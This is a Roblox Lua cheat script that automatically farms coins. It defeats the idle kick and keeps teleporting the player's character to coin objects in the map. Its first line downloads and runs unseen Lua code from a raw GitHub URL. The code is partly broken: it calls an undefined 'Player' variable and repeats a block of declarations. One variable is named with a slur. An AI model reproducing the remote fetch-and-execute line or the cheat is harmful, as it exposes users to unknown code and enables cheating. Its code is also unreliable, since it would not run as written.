loadstring(game:HttpGet("https://raw.githubusercontent.com/Maximusikk/itrScri/main/discordtxt.lua", true))()

local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local Noclip = Instance.new("ScreenGui")
local BG = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Toggle = Instance.new("TextButton")
local StatusPF = Instance.new("TextLabel")
local Status = Instance.new("TextLabel")
local Plr = Players.LocalPlayer
local Clipon = false

Noclip.Name = "Script"
Noclip.Parent = game.CoreGui

BG.Name = "BG"
BG.Parent = Noclip
BG.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
BG.BorderColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
BG.BorderSizePixel = 2
BG.Position = UDim2.new(0.149479166, 0, 0.82087779, 0)
BG.Size = UDim2.new(0, 1, 0, 1)
BG.Active = true
BG.Draggable = true

Title.Name = "Title"
Title.Parent = BG
Title.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
Title.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
Title.BorderSizePixel = 2
Title.Size = UDim2.new(0, 210, 0, 33)
Title.Font = Enum.Font.Highway
Title.Text = "Script"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.FontSize = Enum.FontSize.Size32
Title.TextSize = 30
Title.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Title.TextStrokeTransparency = 0


local VirtualUser = game:GetService("VirtualUser")
Player.Idled:connect(
    function()
        VirtualUser:ClickButton2(Vector2.new())
    end
)
seconds = 3600
secondAft = 0
collectedCoins = 0
trueCollectCoin = 0
function LobbyTeleport()
    for i,v in pairs(Workspace:GetDescendants()) do
        if v.name == "SpawnLocation" then
            Player.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position)
        end
    end
end
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local Noclip = Instance.new("ScreenGui")
local BG = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Toggle = Instance.new("TextButton")
local StatusPF = Instance.new("TextLabel")
local Status = Instance.new("TextLabel")
local Plr = Players.LocalPlayer
local Clipon = false

function checkBalance()
    for you, jej in pairs(Player:GetDescendants()) do
        if jej.Name == "CoinBag" then
            for fit, nig in pairs(jej:GetDescendants()) do
                if nig.Name == "CoinIcon" then
                    for trem, kela in pairs(nig:GetDescendants()) do
                        if kela.Name == "Coins" then
                            print(kela.Text)
                            if collectedCoins ~= tonumber(kela.Text) then
                                trueCollectCoin = trueCollectCoin + 1
                                print(trueCollectCoin)
                            end
                            collectedCoins = tonumber(kela.text)
                            print(collectedCoins)
                        end
                    end
                end
            end
        end
    end
end

function teleportToMoney()
    for i,v in pairs(Workspace:GetDescendants()) do
        if v.name == "Christmas" then
            for kek, lel in pairs(v:GetDescendants()) do
                if lel.name == "Coin_Server" then   
                    checkBalance()     
                    wait(1.7)
                    x = lel.Position.x
                    y = lel.Position.y
                    z = lel.Position.z 
                    Player.Character.HumanoidRootPart.CFrame = CFrame.new(x,y,z)
                    game.Players.LocalPlayer.Character.Humanoid.Jump = true
                    wait(0.8)
                    pcall(LobbyTeleport)
                end
            end
        end
        if v.name == "Normal" then
            for kek, lel in pairs(v:GetDescendants()) do
                if lel.name == "Coin_Server" then
                    checkBalance()
                    wait(1.7)
                    x = lel.Position.x
                    y = lel.Position.y
                    z = lel.Position.z 
                    Player.Character.HumanoidRootPart.CFrame = CFrame.new(x,y,z)
                    game.Players.LocalPlayer.Character.Humanoid.Jump = true
                    wait(0.8)
                    pcall(LobbyTeleport)
                end
            end
        end
    end
end

while wait(1) do
    secondAft = secondAft + 1
    pcall(teleportToMoney)
end
